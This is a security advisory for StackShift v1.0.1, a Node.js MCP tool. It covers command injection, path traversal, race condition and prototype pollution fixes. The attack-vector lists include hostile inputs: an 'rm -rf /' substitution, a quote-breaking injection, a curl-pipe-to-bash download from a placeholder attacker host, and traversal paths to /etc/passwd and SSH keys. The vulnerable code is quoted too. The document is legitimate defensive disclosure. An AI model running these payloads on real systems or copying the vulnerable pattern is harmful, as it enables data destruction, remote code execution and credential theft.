# Security Fixes - StackShift v1.0.1

## Overview

This document details the security vulnerabilities that were identified and fixed in StackShift version 1.0.1.

## Critical Vulnerabilities Fixed

### 1. Command Injection (CWE-78) - CRITICAL

**Severity:** CRITICAL
**CVSS Score:** 9.8
**Location:** `src/tools/analyze.ts:208-209`

#### Vulnerability Description

The `analyzeToolHandler` function used `execAsync()` to execute a shell command with user-controlled input directly interpolated into the command string.

**Vulnerable Code:**
```typescript
const { stdout: testFiles } = await execAsync(
  `find "${directory}" -name "*.test.*" -o -name "*.spec.*" 2>/dev/null | wc -l`
);
```

#### Attack Vectors

An attacker could execute arbitrary commands by providing malicious directory parameters:
- `$(rm -rf /)`
- `/path"; malicious-command; echo "`
- `\`curl http://attacker.com/malware.sh | bash\``

#### Fix

Replaced shell commands with native Node.js file system APIs:
- Created `countFiles()` function in `src/utils/file-utils.ts`
- Uses `fs.readdir()` recursively instead of `find` command
- Includes protection against directory traversal and DoS attacks

**Fixed Code:**
```typescript
const testCount = await countFiles(directory, ['.test.', '.spec.']);
```

---

### 2. Path Traversal (CWE-22) - CRITICAL

**Severity:** CRITICAL
**CVSS Score:** 8.6
**Locations:** All MCP tool handlers

#### Vulnerability Description

User-provided `directory` parameter was never validated, allowing access to arbitrary files outside the intended workspace.

**Vulnerable Pattern:**
```typescript
const directory = args.directory || process.cwd();
const stateFile = path.join(directory, '.stackshift-state.json');
```

#### Attack Vectors

- `../../../../etc` - Access system configuration
- `/etc/passwd` - Read sensitive files
- `../../../.ssh` - Access SSH keys
- `/tmp/../etc/passwd` - Bypass simple validation

#### Fix

Created comprehensive directory validation system:
- New `SecurityValidator` class in `src/utils/security.ts`
- Validates paths are within allowed workspace
- Detects and blocks path traversal attempts
- Checks for shell metacharacters

**Fixed Code:**
```typescript
const validator = createDefaultValidator();
const directory = validator.validateDirectory(args.directory || process.cwd());
```

---

## High-Severity Issues Fixed

### 3. TOCTOU Race Conditions (CWE-367) - HIGH

**Severity:** HIGH
**CVSS Score:** 6.5
**Locations:** All tool handlers

#### Vulnerability Description

State file operations used check-then-act pattern without atomic guarantees:
```typescript
const stateExists = await fs.access(stateFile).then(() => true).catch(() => false);
if (!stateExists) {
  await fs.writeFile(stateFile, ...); // TOCTOU vulnerability
}
```

#### Fix

Implemented atomic file operations:
- Created `StateManager` class with atomic write support
- Uses temporary files with atomic rename
- Prevents data corruption from concurrent access

**Fixed Code:**
```typescript
const stateManager = new StateManager(directory);
await stateManager.initialize(directory, route);
```

---

### 4. Insufficient Input Validation (CWE-20) - HIGH

**Severity:** HIGH
**CVSS Score:** 7.3

#### Vulnerability Description

Tool parameters were not validated for type, format, or allowed values.

#### Fix

Added comprehensive input validation:
- `validateRoute()` - Validates route parameter
- `validateClarificationsStrategy()` - Validates strategy parameter
- `validateImplementationScope()` - Validates scope parameter
- Type checking and length limits for all string parameters

---

### 5. Inadequate JSON Parsing (CWE-20) - HIGH

**Severity:** HIGH

#### Vulnerability Description

State files were parsed with `JSON.parse()` without structure validation, risking:
- Prototype pollution attacks
- Type confusion
- Application crashes

#### Fix

Implemented state validation:
- Schema validation in `StateManager.validateState()`
- Removes dangerous properties (`__proto__`, `constructor`, `prototype`)
- Validates all required fields and types
- 10MB file size limit to prevent DoS

---

## Medium-Severity Issues Fixed

### 6. Code Duplication

**Impact:** Maintenance burden, inconsistent security fixes

#### Fix

Created reusable utility modules:
- `src/utils/security.ts` - Security validation
- `src/utils/state-manager.ts` - State management
- `src/utils/file-utils.ts` - Safe file operations

Eliminated ~200 lines of duplicated code.

---

### 7. Missing Resource Limits

**Impact:** Potential DoS attacks

#### Fix

Added resource constraints:
- Maximum 100 clarifications per request
- Maximum 5000 characters per clarification field
- Maximum 200 characters for feature names
- Maximum 10MB state file size
- Maximum 10,000 files processed during scanning
- Maximum directory depth of 10

---

### 8. No Input Sanitization

**Impact:** Potential injection attacks

#### Fix

Added sanitization throughout:
- Shell metacharacter detection and blocking
- Path normalization before validation
- Dangerous property removal from parsed JSON

---

## Security Test Suite

Created comprehensive test coverage:

### Test Files

1. `src/utils/__tests__/security.test.ts` - Security validator tests
2. `src/utils/__tests__/state-manager.test.ts` - State management tests
3. `src/tools/__tests__/analyze.security.test.ts` - Integration tests

### Test Coverage

- Path traversal protection: 15 test cases
- Command injection prevention: 12 test cases
- Input validation: 20 test cases
- TOCTOU race condition prevention: 5 test cases
- State validation: 10 test cases
- Prototype pollution protection: 5 test cases

### Running Tests

```bash
# Run all tests
npm test

# Run security tests only
npm run test:security

# Run with coverage
npm run test:coverage

# Watch mode
npm run test:watch
```

---

## Security Best Practices Implemented

### 1. Input Validation

✅ All user input validated before use
✅ Allowlist-based validation (not denylist)
✅ Type checking for all parameters
✅ Length limits on all strings and arrays

### 2. Safe File Operations

✅ Native Node.js APIs instead of shell commands
✅ Path validation within workspace boundaries
✅ Atomic write operations
✅ Resource limits to prevent DoS

### 3. Defense in Depth

✅ Multiple layers of security controls
✅ Validation at entry points
✅ Sanitization before use
✅ Safe-by-default APIs

### 4. Secure State Management

✅ Schema validation
✅ Prototype pollution protection
✅ Atomic operations
✅ Concurrent access safety

---

## Files Modified

### New Files Created

```
src/utils/security.ts
src/utils/state-manager.ts
src/utils/file-utils.ts
src/utils/__tests__/security.test.ts
src/utils/__tests__/state-manager.test.ts
src/tools/__tests__/analyze.security.test.ts
vitest.config.ts
SECURITY-FIXES.md
```

### Files Updated

```
src/tools/analyze.ts
src/tools/reverse-engineer.ts
src/tools/create-specs.ts
src/tools/gap-analysis.ts
src/tools/complete-spec.ts
src/tools/implement.ts
src/tools/cruise-control.ts
package.json
```

---

## Breaking Changes

### None

All security fixes are backward compatible. Existing functionality is preserved while adding security controls.

---

## Recommendations for Users

### Immediate Actions

1. **Update to v1.0.1 immediately** - Critical vulnerabilities patched
2. **Review access logs** - Check for any suspicious directory access attempts
3. **Run security tests** - Verify fixes work in your environment:
   ```bash
   npm run test:security
   ```

### Best Practices

1. **Principle of Least Privilege** - Run MCP server with minimal permissions
2. **Workspace Isolation** - Use dedicated directories for StackShift projects
3. **Network Isolation** - Consider running in containerized environment
4. **Regular Updates** - Keep StackShift and dependencies up to date

---

## Vulnerability Disclosure

If you discover a security vulnerability in StackShift, please report it to:
- Email: [security contact from package.json author]
- GitHub: Private security advisory

**Do not** open public issues for security vulnerabilities.

---

## Version History

### v1.0.1 (2025-11-16)
- Fixed 2 critical vulnerabilities (command injection, path traversal)
- Fixed 3 high-severity issues (TOCTOU, input validation, JSON parsing)
- Fixed 3 medium-severity issues (code duplication, resource limits, sanitization)
- Added comprehensive security test suite
- Zero breaking changes

### v1.0.0 (2025-11-15)
- Initial release (contained vulnerabilities)

---

## Acknowledgments

Security review performed using industry-standard methodologies:
- OWASP Top 10
- CWE Top 25
- Node.js Security Best Practices
- NIST Secure Coding Standards

---

## References

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-367: TOCTOU Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
